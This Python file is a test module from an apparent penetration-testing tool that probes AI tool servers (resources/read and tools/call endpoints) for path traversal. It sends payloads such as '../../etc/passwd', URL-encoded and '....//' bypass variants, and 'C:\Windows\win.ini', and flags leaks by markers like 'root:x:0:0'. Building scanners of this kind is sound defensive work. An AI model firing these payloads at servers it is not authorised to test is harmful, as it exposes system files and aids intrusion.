"""Resource path traversal tests"""
import urllib.parse


class ResourceTraversalTest:
    """Test path traversal on resources and tools"""
    
    LEAK_MARKERS = [
        "root:x:0:0", "[extensions]", "PDO Exception",
        "java.io.FileNotFound", "boot loader"
    ]

    def __init__(self, pentester):
        self.pentester = pentester

    def run(self):
        """Execute resource traversal tests"""
        self.pentester.health_check()
        findings = []
        findings.extend(self._test_resource_uris())
        findings.extend(self._test_tool_arguments())
        return findings

    def _test_resource_uris(self):
        findings = []
        try:
            resources_list, _ = self.pentester.send("resources/list", {})
            valid_uris = [r['uri'] for r in resources_list.get('resources', [])]
        except Exception:
            valid_uris = ["file:///tmp/test"]

        payloads = [
            "/../../../../../../../../../../../../etc/passwd",
            "/../../../../../../../../../../../../windows/win.ini",
            "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
        ]

        targets = set()
        for uri in valid_uris:
            parsed = urllib.parse.urlparse(uri)
            for p in payloads:
                targets.add(f"{parsed.scheme}://{p}")
                if parsed.path:
                    targets.add(f"{uri}{p}")
        
        for p in payloads:
            targets.add(f"file://{p}")

        for target_uri in targets:
            try:
                resp, _ = self.pentester.send("resources/read", {"uri": target_uri})
                if self._check_leak(resp):
                    findings.append({
                        'type': 'RESOURCE_TRAVERSAL',
                        'severity': 'CRITICAL',
                        'payload': target_uri,
                        'evidence': str(resp.get('contents', ''))[:50]
                    })
                    break
            except Exception:
                pass
        return findings

    def _test_tool_arguments(self):
        findings = []
        try:
            tools_list, _ = self.pentester.send("tools/list", {})
            tools = tools_list.get('tools', [])
        except Exception:
            return findings

        suspicious_args = ['path', 'file', 'filename', 'filepath', 'src', 'source', 'dir']
        payloads = [
            "../../../../../../../../../../../../etc/passwd",
            "C:\\Windows\\win.ini",
            "....//....//....//etc/passwd"
        ]

        for tool in tools:
            schema = tool.get('inputSchema', {})
            for arg_name in schema.get('properties', {}).keys():
                if any(s in arg_name.lower() for s in suspicious_args):
                    for payload in payloads:
                        args = {arg_name: payload}
                        for req in schema.get('required', []):
                            if req != arg_name:
                                args[req] = "dummy"

                        try:
                            resp, _ = self.pentester.send("tools/call", {
                                "name": tool['name'],
                                "arguments": args
                            })
                            content = str(resp.get('content', ''))
                            if self._check_leak(content):
                                findings.append({
                                    'type': 'TOOL_PATH_TRAVERSAL',
                                    'severity': 'CRITICAL',
                                    'tool': tool['name'],
                                    'argument': arg_name,
                                    'payload': payload,
                                    'evidence': content[:50]
                                })
                        except Exception:
                            pass
        return findings

    def _check_leak(self, content):
        if not content:
            return False
        content_str = str(content)
        return any(marker in content_str for marker in self.LEAK_MARKERS)
